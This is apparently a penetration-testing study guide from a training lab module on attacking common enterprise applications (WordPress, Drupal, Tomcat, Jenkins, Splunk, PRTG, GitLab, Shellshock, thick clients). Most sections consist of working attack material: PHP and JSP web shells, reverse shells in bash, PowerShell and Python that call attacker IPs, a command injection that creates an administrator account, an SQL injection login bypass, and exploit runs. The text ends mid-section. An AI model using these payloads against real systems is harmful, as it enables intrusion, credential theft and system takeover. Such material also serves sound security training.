Attacking Common Applications — Complete Module Documentation

> A comprehensive reference guide covering discovery, enumeration, and exploitation of common enterprise applications encountered during penetration tests.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Application Discovery & Enumeration](#2-application-discovery--enumeration)
3. [WordPress](#3-wordpress)
4. [Joomla](#4-joomla)
5. [Drupal](#5-drupal)
6. [Tomcat](#6-tomcat)
7. [Jenkins](#7-jenkins)
8. [Splunk](#8-splunk)
9. [PRTG Network Monitor](#9-prtg-network-monitor)
10. [osTicket](#10-osticket)
11. [GitLab](#11-gitlab)
12. [Tomcat CGI (CVE-2019-0232)](#12-tomcat-cgi-cve-2019-0232)
13. [Shellshock via CGI (CVE-2014-6271)](#13-shellshock-via-cgi-cve-2014-6271)
14. [Thick Client Applications](#14-thick-client-applications)
15. [Thick Client Web Vulnerabilities](#15-thick-client-web-vulnerabilities)
16. [Key Takeaways](#16-key-takeaways)

---

## 1. Introduction

### Core Concept
Web applications are the most prevalent attack surface in modern environments. The same applications appear across countless organizations, but security varies wildly — an app that is secure in one environment may be misconfigured or unpatched in another.

### Why This Matters
- Organizations harden external perimeters — web apps become the primary target
- Remote work exposes more apps to the internet
- Same app can be a foothold, lateral movement path, or sensitive data source
- Both external and internal assessments rely on these skills

### Mindset
- Don't just reproduce exploits — understand how the app works
- Learn why vulnerabilities and misconfigurations exist
- Apply skills to unfamiliar applications
- Never overlook an application — it may be the only way in

### Common Application Categories

Category | Examples
CMS | WordPress, Drupal, Joomla, DotNetNuke
App Servers | Tomcat, WebLogic, WebSphere
SIEM | Splunk, Trustwave, LogRhythm
Network Monitoring | PRTG, ManageEngine OpManager
IT Management | Nagios, Puppet, Zabbix
Source/Config Management | GitLab, JIRA, GitHub, Bitbucket
Dev Tools | Jenkins, Confluence, phpMyAdmin
Customer Service | osTicket, Zendesk

---

## 2. Application Discovery & Enumeration

### Why Discovery Matters
Many organizations don't know what's on their network. Enumeration finds:
- Forgotten applications
- Expired-trial / demo software (no authentication)
- Default/weak credentials
- Misconfigured or unauthorized apps
- Publicly vulnerable apps

### Discovery Workflow

Ping sweep → find live hosts
Nmap common web ports: 80, 443, 8000, 8080, 8180, 8888, 10000
Run EyeWitness or Aquatone on Nmap XML output
Review screenshots → identify web apps quickly
Deeper scans: top 10k ports or all TCP ports, -sV
Repeat screenshotting on every new scan
Note interesting hosts for later testing

### Key Nmap Command

sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

### Screenshot Tools

Tool | Input | Output
EyeWitness | Nmap XML, Nessus XML | Screenshots, fingerprinting, default creds suggestions
Aquatone | Nmap XML, Masscan XML | Screenshots, HTML report with clusters

EyeWitness

sudo apt install eyewitness
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

Aquatone

cat web_discovery.xml | ./aquatone -nmap
# Creates aquatone_report.html

### Notetaking Structure

External Penetration Test — <Client Name>
├── Scope
├── Client Points of Contact
├── Credentials
├── Discovery/Enumeration
│   ├── Scans (date/time + syntax)
│   ├── Live hosts
│   └── Application Discovery
│       ├── Scans
│       └── Interesting/Notable Hosts
├── Exploitation
│   └── <Hostname or IP>
└── Post-Exploitation
    └── <Hostname or IP>

### What to Note in Screenshot Reports
- High Value Targets (Tomcat, Jenkins, osTicket, custom apps)
- CMS (WordPress, Joomla, Drupal)
- Splunk, GitLab, PRTG
- SSH keys, default creds, sensitive data
- Do not attack immediately — finish discovery first

### External vs Internal Expectations

External | Internal
Custom apps, CMS | Everything external + more
Tomcat, Jenkins, Splunk | Printers (LDAP creds), ESXi/vCenter
RDS, SSL VPN, OWA, O365 | iLO/iDRAC, network devices, IoT
Edge device portals | SharePoint, intranet, code repos

---

## 3. WordPress

### What Is It?
- Open-source CMS launched 2003
- Powers ~32.5% of all websites
- PHP + Apache + MySQL
- 50,000+ plugins, 4,100+ themes

### Vulnerability Distribution
- 54% plugins
- 31.5% core
- 14.5% themes

### Discovery

# robots.txt reveals wp-admin and wp-content
curl -s http://blog.inlanefreight.local/robots.txt

# Generator meta tag in source
curl -s http://blog.inlanefreight.local/ | grep WordPress
# <meta name="generator" content="WordPress 5.8" />

### Manual Enumeration
- Themes: look for wp-content/themes/... in source
- Plugins: look for wp-content/plugins/... in source
- Versions: often in readme.txt inside plugin/theme folders
- Users: login error messages differ for valid vs invalid usernames

### WPScan

sudo gem install wpscan
wpscan --url http://blog.inlanefreight.local --enumerate --api-token YOUR_TOKEN

### User Enumeration
- /wp-login.php reveals valid users via error messages
- "The password for username admin is incorrect" = valid user
- "The username someone is not registered" = invalid

### Attack Path A: Login Brute Force

wpscan --url http://blog.inlanefreight.local \
  --password-attack xmlrpc -U john -P rockyou.txt

xmlrpc method is faster than wp-login. Brute force is possible via XML-RPC.

### Attack Path B: Theme Editor RCE

Log in as admin
Appearance → Theme Editor
Select inactive theme (e.g., Twenty Nineteen)
Edit 404.php → add system($_GET[0]);

Access:

curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id"

### Attack Path C: Metasploit

use exploit/unix/webapp/wp_admin_shell_upload
set username doug
set password jessica1
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
run

Requires both RHOST and VHOST.

### Vulnerable Plugins
- mail-masta: LFI via ?pl=/etc/passwd
- wpDiscuz 7.0.4: unauthenticated file upload bypass → RCE
- WP Sitemap Page: version 1.9.1

### WordPress Flag Locations
- /var/www/blog.inlanefreight.local/flag_<hash>.txt (webroot)
- /wp-content/uploads/.../flag.txt (decoy)

---

## 4. Joomla

### What Is It?
- Released August 2005
- ~3.5% CMS market share (~2.5M sites)
- PHP + MySQL
- 7,000+ extensions, 1,000+ templates
- Used by eBay, Yamaha, Harvard, UK government

### Discovery

# Page source generator
curl -s http://dev.inlanefreight.local/ | grep Joomla
# <meta name="generator" content="Joomla! - Open Source Content Management" />

# robots.txt
# Disallow: /administrator/, /components/, /plugins/

# README.txt
curl -s http://dev.inlanefreight.local/README.txt | head -n 5

### Version Fingerprinting

# Exact version
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
# <version>3.9.4</version>

# Approximate version
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml

### Enumeration Tools

# droopescan
droopescan scan joomla --url http://dev.inlanefreight.local/

# JoomlaScan (Python 2.7)
python2 joomlascan.py -u http://dev.inlanefreight.local

### Login & User Enumeration
- Admin login: /administrator/index.php
- User enumeration does NOT work — generic error messages
- Default admin username: admin — password set at install

### Brute Force

python3 joomla-brute.py \
  -u http://app.inlanefreight.local \
  -w ~/htb/http_default_pass.txt \
  -usr admin

Result: admin:turnkey (or admin:admin in module examples)

### Attack Path A: Template Editor RCE

Log in as admin
Templates under Configuration
Pick a template (e.g., protostar)
Edit error.php:

system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

Access:

curl "http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"

### Attack Path B: CVE-2019-10945 (Directory Traversal)

Affects Joomla 1.5.0 – 3.9.4. Authenticated file deletion + directory traversal.

python3 joomla_dir_trav.py \
  --url "http://dev.inlanefreight.local/administrator/" \
  --username admin --password admin \
  --dir /

### Joomla Flag Discovery
- Use the traversal to list the webroot
- Find flag_<hash>.txt
- Read via curl "http://dev.inlanefreight.local/flag_<hash>.txt"

---

## 5. Drupal

### What Is It?
- Launched 2001
- ~1.5% of internet sites, ~2.4% CMS market
- PHP + MySQL/PostgreSQL/SQLite
- 43,000+ modules, 2,900+ themes
- Used by Tesla, Warner Bros
- 56% of government sites, 23.8% of universities

### Discovery

# Page source
curl -s http://drupal.inlanefreight.local | grep Drupal
# <meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />

# Node URLs: /node/1, /node/2, etc.

### Version Fingerprinting

# Older installs (blocked in v8+)
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | head -3
# Drupal 7.57, 2018-02-21

# Drupal 7.x
curl -s http://drupal-qa.inlanefreight.local/modules/system/system.info
# version = "7.30"

# Droopescan (best for Drupal)
droopescan scan drupal -u http://drupal.inlanefreight.local

### Default User Roles
- Administrator — full control
- Authenticated User — content editing based on permissions
- Anonymous — read-only

### Attack Path A: PHP Filter Module (Drupal 7)

Log in as admin
Modules → enable PHP filter
Content → Add content → Basic page
Insert:

<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>

Set Text format to PHP code
Save → access /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id

### Attack Path B: Backdoored Module

Download legit module (e.g., CAPTCHA)
Add shell.php with system($_GET['...'])
Add .htaccess to bypass /modules block
Repackage and upload via Extend → Install new module

### Drupalgeddon Vulnerabilities

CVE | Name | Affects | Type
CVE-2014-3704 | Drupalgeddon | 7.0 – 7.31 | Pre-auth SQLi (create admin user)
CVE-2018-7600 | Drupalgeddon2 | < 7.58, < 8.5.1 | Pre-auth RCE (user registration)
CVE-2018-7602 | Drupalgeddon3 | Multiple 7.x/8.x | Authenticated RCE (Form API)

### Drupalgeddon2 Exploit

# Ruby script (most reliable)
wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/drupalgeddon2.rb
sudo gem install highline
ruby drupalgeddon2.rb http://drupal-dev.inlanefreight.local/
# Shell prompt: drupalgeddon2> cat /var/www/drupal.inlanefreight.local/flag.txt

### Drupalgeddon3 (Metasploit)

use exploit/multi/http/drupal_drupageddon3
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set drupal_session SESS...
set DRUPAL_NODE 1
set LHOST 10.10.14.15
run

---

## 6. Tomcat

### What Is It?
- Open-source Java web server
- Runs Servlets and JSP
- 220,000+ live websites
- Used by Alibaba, USPTO, American Red Cross, LA Times
- Common internally; less exposed externally

### Discovery

# 404 page reveals version
curl -s http://app-dev.inlanefreight.local:8080/invalid

# /docs page
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat

### Directory Structure

├── bin                # Scripts and binaries
├── conf
│   ├── tomcat-users.xml   ← Credentials + roles
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps             ← Default webroot
│   ├── manager
│   └── ROOT
└── work

### Application Structure

webapps/customapp
├── images
├── index.jsp
├── META-INF/context.xml
└── WEB-INF
    ├── web.xml        ← Deployment descriptor
    ├── jsp/admin.jsp
    ├── classes/AdminServlet.class
    └── lib/jdbc_drivers.jar

### Manager Roles
- manager-gui — HTML GUI
- manager-script — HTTP API
- manager-jmx — JMX proxy
- manager-status — Status pages only
- admin-gui — Host-manager admin

### Discovery with Gobuster

gobuster dir -u http://web01.inlanefreight.local:8180/ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
# /docs, /examples, /manager

### Brute Force

# Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set RHOSTS 10.129.201.58
set STOP_ON_SUCCESS true
run
# Result: tomcat:admin

# Hydra (faster)
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -f -t 30 -I web01.inlanefreight.local -s 8180 http-get /manager/html

### WAR File Upload — RCE

# Download JSP web shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

# Deploy via /manager/html → WAR file to deploy → Browse → Deploy
# Access shell:
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
# uid=1001(tomcat) gid=1001(tomcat)

### Reverse Shell WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
# Deploy → nc -lnvp 4443

### CVE-2020-1938 — Ghostcat
- Unauthenticated LFI via AJP protocol
- Affects: Tomcat < 9.0.31, < 8.5.51, < 7.0.100
- Port 8009 (AJP)
- Read files inside /webapps only

nmap -sV -p 8009,8080 app-dev.inlanefreight.local
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml

### Common Tomcat Flag Locations
- /opt/tomcat/apache-tomcat-<version>/webapps/tomcat_flag.txt
- /var/www/html/flag.txt

### Cleanup
- Undeploy the app via /manager/html
- Document uploaded file paths in report

---

## 7. Jenkins

### What Is It?
- Open-source CI/CD automation server (Java)
- Runs in a servlet container like Tomcat
- Used by Facebook, Netflix, Udemy, Robinhood, LinkedIn
- 300+ plugins

### Default Ports
- 8080 — Web UI
- 5000 — Master/slave communication

### Discovery
- Login page is highly recognizable
- /configureSecurity/ reveals auth settings
- X-Jenkins header reveals version

curl -I http://jenkins.inlanefreight.local:8000/
# X-Jenkins: 2.303.1

### Version Discovery

curl -sI http://jenkins.inlanefreight.local:8000/ | grep -i "X-Jenkins"
# X-Jenkins: 2.303.1

### Common Weaknesses
- No authentication (anonymous access)
- Weak creds (admin:admin, jenkins:jenkins)
- Open user registration

### Attack Path: Script Console RCE

Location: http://<target>/script

Simple command execution:

def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

Read a file directly:

println new File('/var/lib/jenkins3/flag.txt').text

Linux reverse shell:

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

Windows command execution:

def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

### Known CVEs
- CVE-2018-1999002 + CVE-2019-1003000 — Pre-auth RCE (Jenkins 2.137)
- CVE-2019-1003000 — Auth RCE via Node.js (Jenkins 2.150.2)
- Fixed in Jenkins 2.303.1

### Flag Location
- /var/lib/jenkins3/flag.txt (19 bytes in the lab)

---

## 8. Splunk

### What Is It?
- Log analytics + SIEM tool
- 7,500+ employees, ~$2.4B revenue
- Used by 92 of Fortune 100
- 2,000+ apps on Splunkbase

### Default Ports
- 8000 — Web server (HTTPS/HTTP)
- 8089 — REST API

### Notable CVEs
- CVE-2018-11409 — Info disclosure
- CVE-2011-4642 — Auth RCE (very old)

### Discovery

sudo nmap -sV 10.129.201.50
# 8000/tcp open  ssl/http  Splunkd httpd
# 8089/tcp open  ssl/http  Splunkd httpd

### Authentication
- Older versions: admin:changeme
- Latest: set during installation
- Common weak: admin, Welcome, Welcome1, Password123

### The Big Misconfiguration: Free Version
- Trial converts to Free after 60 days
- Free version = no authentication
- Common oversight → sensitive data + RCE exposure

### Version Discovery

curl -k https://10.129.201.50:8089/services/server/info
# <generator build="87344edfcdb4" version="8.2.2"/>
# <s:key name="version">8.2.2</s:key>

### Attack: Scripted Input RCE

STEP 1: Create the app structure

splunk_shell/
├── bin/
│   ├── run.ps1   (or rev.py for Linux)
│   └── run.bat   (Windows)
└── default/
    └── inputs.conf

STEP 2: PowerShell reverse shell (bin/run.ps1)

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.215',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

STEP 3: Launcher (bin/run.bat)

@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

STEP 4: Trigger config (default/inputs.conf)

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10

STEP 5: Package and upload

tar -cvzf updater.tar.gz splunk_shell/
# Upload via Apps → Install app from file

STEP 6: Catch shell

sudo nc -lnvp 443
# connect to [10.10.14.215] ... PS C:\Windows\system32>

Linux variant (bin/rev.py):

import sys,socket,os,pty
ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

### Lateral Movement via Deployment Server
- Place app in $SPLUNK_HOME/etc/deployment-apps/
- Pushed to all Universal Forwarders → mass RCE
- Note: Forwarders don't ship with Python → use PowerShell/batch

### Shell Context
- Windows: NT AUTHORITY\SYSTEM
- Linux: root

---

## 9. PRTG Network Monitor

### What Is It?
- Agentless network monitoring (Paessler)
- First released 2003; free version 2015 (100 sensors / 20 hosts)
- Used by Naples Airport, Virginia Tech, 7-Eleven
- 26 CVEs total; only 4 with public PoCs

### Discovery

sudo nmap -sV -p- --open -T4 10.129.201.50
# 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)

curl -s http://10.129.201.50:8080/index.htm \
  -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
# PRTG Network Monitor 18.1.37.13946

### Credentials
- Default: prtgadmin:prtgadmin
- Common weak: prtgadmin:Password123

### CVE-2018-9276 — Authenticated Command Injection
- Affects: PRTG < 18.2.39
- Injection point: Notification → Execute Program → Parameter field

### Exploitation — Manual

STEP 1: Log in at http://<target>:8080
STEP 2: Navigate to Notifications — Setup → Account Settings → Notifications → Add new notification
STEP 3: Configure
  Name: pwn
  Status: Started
  Tick EXECUTE PROGRAM
  Program File: Demo exe notification - outfile.ps1
  Parameter:

test.txt;net user prtgadm1 Password123 /add;net localgroup administrators prtgadm1 /add

STEP 4: Save and Test
  Click Save
  Find notification in list → click Test
  Pop-up: "EXE notification is queued up."

STEP 5: Verify

crackmapexec smb 10.129.201.50 -u prtgadm1 -p 'Password123'
# [+] APP03\prtgadm1:Password123 (Pwn3d!)

STEP 6: Get shell

evil-winrm -i 10.129.201.50 -u prtgadm1 -p 'Password123'
type C:\Users\Administrator\Desktop\flag.txt

### Exploitation — Metasploit (Recommended)

msfconsole -q
use exploit/windows/http/prtg_authenticated_rce
set RHOSTS 10.129.201.50
set RPORT 8080
set LHOST 10.10.14.215
set LPORT 4444
set ADMIN_USERNAME prtgadmin
set ADMIN_PASSWORD Password123
run

Then:

meterpreter > ls C:\\Users\\Administrator\\Desktop\\
meterpreter > cat "C:\\Users\\Administrator\\Desktop\\flag.txt"

### Manual Failure Points
- ! in password breaks PowerShell parsing → remove special chars
- "Test" button may not fire → click multiple times
- Status must be Started
- Metasploit handles encoding reliably

### Persistence
- Notification can be scheduled (e.g., every day)
- Use for long-term engagements

---

## 10. osTicket

### What Is It?
- Open-source support ticketing system
- PHP + MySQL
- Used by companies, schools, universities, local governments
- Featured in Mr. Robot

### Footprint
- Cookie: OSTSESSID
- Footer: "Powered by osTicket"
- Nmap only shows Apache/IIS — no application fingerprint

### Vulnerability Landscape
- Very few CVEs — well maintained
- CVE-2020-24881 (v1.14.1) — SSRF
- Other older issues: RFI, SQLi, arbitrary file upload, XSS

### The Real Value: Built-In Functionality

Even without CVEs, osTicket provides:
- Company email addresses
- Leaked credentials in tickets
- Password reuse opportunities
- Username lists for spraying

### Email Harvesting Attack

Find a service requiring company email (Slack, GitLab, Wiki)
Submit a support ticket → get internal email (e.g., 940288@company.local)
Register on the service with that email
Confirmation email arrives in the ticket portal
Gain access to the third-party service

### Attack Path: Login as Support Agent

# Login page: /scp/login.php
# Credentials from OSINT: kevin@inlanefreight.local / Fish1ng_s3ason!

Login quirk: accepts email OR username — always try both.

### Finding Sensitive Data

Log in as support agent
Filter tickets to Closed
Look for password resets, VPN issues
Read agent replies — credentials often sent in plaintext

### Example Ticket Finding

Ticket from Charles Smithson about VPN lockout
Agent Kevin Grimes sends password in plaintext: Inlane_welcome!

### Broader Impact
- Password likely a standard new-joiner password
- Try against VPN, email, AD — likely reused
- Use for password spraying across other users

### Client Recommendations
- Limit externally exposed applications
- Enforce MFA on all external portals
- Security awareness training (don't use corporate email for 3rd-party)
- Strong password policy (no common words, seasons, company name)
- Force password change on first login; expire passwords

---

## 11. GitLab

### What Is It?
- Web-based Git repository hosting
- Wiki, issue tracking, CI/CD
- Open-source (Community + Enterprise)
- 30M+ registered users in 66 countries
- Used by Drupal, Goldman Sachs, HackerOne, Ticketmaster, Nvidia

### Why It Matters

Repositories often leak:
- Hardcoded credentials
- SSH private keys
- API keys
- Production code with bugs
- Infrastructure information

### Repository Visibility

Type | Access
Public | Anyone (no auth)
Internal | Any authenticated user
Private | Specific users only

### Discovery
- Login page at /users/sign_in with GitLab logo
- Version only visible after login at /help
- Known critical CVEs: 11.4.7, 12.9.0, CE 13.10.2, 13.9.3, 13.10.3

### Enumeration Steps

STEP 1: Explore public projects

http://gitlab.inlanefreight.local/explore

STEP 2: Try registering

http://gitlab.inlanefreight.local/users/sign_up

STEP 3: Username enumeration via signup form
  "Username is already taken" → user exists
  "Email has already been taken" → email exists
  Works even when signup is disabled

### Username Enumeration Script

python3 gitlab_userenum.py \
  --url http://gitlab.inlanefreight.local:8081/ \
  --wordlist /usr/share/seclists/Usernames/cirt-default-usernames.txt

### PostgreSQL Password from Public Project

Open Inlanefreight dev project
Open phpunit_pgsql.xml:

<var name="db_password" value="postgres"/>

### CVE-2021-22205 — Authenticated RCE via ExifTool

Affects: GitLab CE ≤ 13.10.2
Root cause: ExifTool image metadata handling
Requires valid user account

Exploit (searchsploit):

searchsploit -m 49951
sudo apt install -y djvulibre-bin

python3 49951.py \
  -t http://gitlab.inlanefreight.local:8081 \
  -u hacker -p Welcome \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.215 8443 >/tmp/f'

Catch shell:

sudo nc -lnvp 8443
# connect to ... git@app04:~/gitlab-workhorse$
id
# uid=996(git) gid=997(git)
ls
# flag_gitlab.txt
cat flag_gitlab.txt

### Lockout Defaults (pre-16.6)
- 10 failed login attempts → 10 min lockout
- Can be configured via max_login_attempts and failed_login_attempts_unlock_period_in_minutes

### Mitigations
- Enforce 2FA
- Fail2Ban for brute force
- IP allowlisting

---

## 12. Tomcat CGI (CVE-2019-0232)

### The Vulnerability
- CVE-2019-0232 — Critical RCE in Tomcat's CGI Servlet
- Windows only — requires enableCmdLineArguments
- Cause: CGI Servlet doesn't validate query string before passing to CGI scripts
- Result: command injection via & separator

### Affected Versions

Branch | Vulnerable Range
Tomcat 9 | 9.0.0.M1 – 9.0.17
Tomcat 8 | 8.5.0 – 8.5.39
Tomcat 7 | 7.0.0 – 7.0.93

### Enumeration

nmap -p- -sC -Pn 10.129.204.227 --open
# 8080/tcp open http-proxy
# _http-title: Apache Tomcat/9.0.17

### Finding CGI Scripts

# Fuzz for .bat files (Windows)
ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://10.129.204.227:8080/cgi/FUZZ.bat
# Result: welcome

### Exploitation

# Basic injection
http://10.129.204.227:8080/cgi/welcome.bat?&dir

# Dump environment
http://10.129.204.227:8080/cgi/welcome.bat?&set

# PATH is empty — use full paths
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
# → BLOCKED by Tomcat filter (invalid character)

# URL-encode to bypass
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
# → nt authority\system (or tomcat user)

### URL Encoding Reference

Char | Encoded
: | %3A
\ | %5C
(space) | %20
/ | %2F

### Find the Flag

# Search for flag
curl -H 'User-Agent: () { :; }; ...' ...

# Or via cmd
curl "http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Ccmd.exe%20%2Fc%20dir"

---

## 13. Shellshock via CGI (CVE-2014-6271)

### What Is Shellshock?
- CVE-2014-6271
- Vulnerability in GNU Bash ≤ 4.3
- Discovered 2014 — 25-year-old bug
- Exploits function definitions in environment variables

### Vulnerable Behavior

env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
# Vulnerable → prints "vulnerable-shellshock" then "not vulnerable"
# Patched → prints only "not vulnerable"

### Where It's Found
- Old Linux servers
- IoT devices
- Embedded systems
- Legacy Apache installs

### Enumeration

gobuster dir -u http://10.129.204.231/cgi-bin/ \
  -w /usr/share/wordlists/dirb/small.txt -x cgi
# Result: /access.cgi (200)

### Confirm the Vulnerability

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
# Returns /etc/passwd contents if vulnerable

### Reverse Shell

# Start listener
sudo nc -lvnp 7777

# Send payload
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' \
  http://10.129.204.231/cgi-bin/access.cgi

### Find the Flag

# Search
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/find / -name flag.txt 2>/dev/null' \
  http://10.129.205.27/cgi-bin/access.cgi
# Result: /usr/lib/cgi-bin/flag.txt

# Read
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /usr/lib/cgi-bin/flag.txt' \
  http://10.129.205.27/cgi-bin/access.cgi

### Mitigation
- Update Bash (quickest fix)
- For IoT/embedded: remove internet exposure, decommission, or firewall off
- Best: upgrade or take offline

### Why It Still Matters
- ~10 years old but still in the wild
- Common in legacy and IoT environments
- Always test CGI scripts for Shellshock

---

## 14. Thick Client Applications

### What Is a Thick Client?
- Installed locally (not browser-based)
- Doesn't need internet to run
- Better use of local CPU, memory, storage
- Common in enterprise: project management, CRM, inventory, productivity

### Built With
Java, C++, .NET, Microsoft Silverlight

### Examples
Web browsers, media players, chat apps, video games, custom enterprise tools

### Characteristics

Trait | Detail
Independent | Yes
Internet | Not required
Data | Local
Security | Weaker than web apps
Resources | Higher consumption
Cost | More expensive to maintain

### Two-Tier vs Three-Tier

Two-Tier: App → directly to database (Less secure)
Three-Tier: App → Application Server → Database (More secure, DB shielded)

### Thick Client Vulnerabilities
- Improper Error Handling
- Hardcoded sensitive data
- DLL Hijacking
- Buffer Overflow
- SQL Injection
- Insecure Storage
- Session Management flaws

### Penetration Testing Steps

A. Information Gathering
  Architecture (2-tier / 3-tier)
  Languages, frameworks
  Entry points, user inputs
  Tools: CFF Explorer, Detect It Easy, Process Monitor, Strings

B. Client-Side Attacks
  Static analysis (EXE, DLL, JAR, CLASS, WAR)
  Dynamic analysis (memory inspection)
  Tools: Ghidra, IDA, OllyDbg, Radare2, dnSpy, x64dbg, JADX, Frida

C. Network-Side Attacks
  Sniff client/server traffic
  Tools: Wireshark, tcpdump, TCPView, Burp Suite

D. Server-Side Attacks
  Same as web apps (OWASP Top 10)

### Case Study: Hardcoded Credentials

Find RestartOracle-Service.exe on SMB share
ProcMon shows it drops a temp file
Change Temp folder permissions → prevent deletion
Re-run → capture the batch file
Batch drops a base64-encoded executable decoded via PowerShell
Remove deletion commands → keep oracle.txt, monta.ps1, restart-service.exe
Run decoded binary → banner "Restart Oracle by HelpDesk 2010"
Debug with x64dbg → find memory-mapped region
Dump Memory to File → get the embedded EXE
de4dot → deobfuscate
dnSpy → decompile → read hardcoded credentials

### Result

Credentials found in the source:

svc_oracle:#oracle_s3rV1c3!2010

### Key Techniques
- Permission manipulation to prevent cleanup
- Memory-mapped self-extracting executables are common
- Deobfuscate with de4dot, decompile with dnSpy

---

## 15. Thick Client Web Vulnerabilities

### Scenario

Three-tier thick client (Java) found on FTP server with:
- fatty-client.jar
- note.txt, note2.txt, note3.txt

### Notes Reveal
- Server moved from port 8000 → 1337
- Client requires Java 8
- Credentials: qtc:clarabi

### First Attempt: Connection Error
- Client still hits port 8000
- Fix: edit beans.xml → change port to 1337
- Also add DNS: echo <ip> server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts

### Signed JAR Bypass
- Edit META-INF/MANIFEST.MF — remove all SHA-256-Digest: lines
- Delete META-INF/1.RSA and META-INF/1.SF
- Ensure file ends with a newline
- Rebuild:

jar -cmf META-INF/MANIFEST.MF ..\fatty-client-new.jar *

### Discovery: beans.xml

<bean id="connectionContext" class="htb.fatty.shared.connection.ConnectionContext">
  <constructor-arg index="0" value = "server.fatty.htb"/>
  <constructor-arg index="1" value = "8000"/>   ← change to 1337
</bean>

<bean id="secretHolder" class="htb.fatty.shared.connection.SecretHolder">
  <property name="secret" value="clarabibiclarabibiclarabibi"/>
</bean>

### Foothold: qtc user
- ServerStatus options greyed out
- FileBrowser → Notes.txt → security.txt (hints)
- FileBrowser → Mail → dave.txt:
  All admin users were removed
  Login timeout added to mitigate time-based SQLi

### Path Traversal
- Try: ../../../../../../etc/passwd
- Server filters / → blocked
- Modify client's ClientGuiTest.java:

ClientGuiTest.this.currentFolder = "..";
response = ClientGuiTest.this.invoker.showFiles("..");

Rebuild → FileBrowser → Config shows parent → fatty-server.jar, start.sh

### Download Server JAR

Modify Invoker.java → open() method to save the file:

import java.io.FileOutputStream;

public String open(String foldername, String filename) {
    ...
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    return "Successfully saved the file to " + desktopPath;
}

### SQL Injection

Decompiled FattyDbSession.java:

rs = stmt.executeQuery(
  "SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'"
);

Password hashing in User.java:

sha256(username + password + "clarabibimakeseverythingsecure")

### SQLi + Client Modification Attack

Modify User.java → setPassword() to store plaintext:

public void setPassword(String password) {
    this.password = password;
}

Recompile → rebuild JAR

Login payload:
  Username: abc' UNION SELECT 1,'abc','a@b.com','abc','admin
  Password: abc

Server executes:

SELECT id,username,email,password,role FROM users
WHERE username='abc'
UNION SELECT 1,'abc','a@b.com','abc','admin'

First SELECT fails, second injects fake admin user. Password matches → login as admin.

### Read the eth0 IP

After becoming admin:
